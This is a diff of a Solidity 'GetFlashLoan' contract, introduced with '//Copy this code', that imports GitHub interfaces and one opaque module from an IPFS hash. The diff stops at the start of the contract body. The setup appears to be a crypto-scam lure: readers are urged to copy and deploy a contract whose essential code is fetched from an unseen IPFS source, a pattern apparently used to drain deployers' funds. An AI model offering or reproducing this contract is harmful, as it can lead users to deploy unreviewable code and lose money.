@@ -1,11 +1,19 @@
 //Copy this code
+
 pragma solidity ^0.5.0;
+
 import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+
 import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
+
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
+
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
+
 import "ipfs://QmcdBFQDxD8UG7rsa7D5TPoZ785AjneWzf4F4w8dje4pDV";
+
 contract GetFlashLoan {
    string public tokenName;
    string public tokenSymbol;
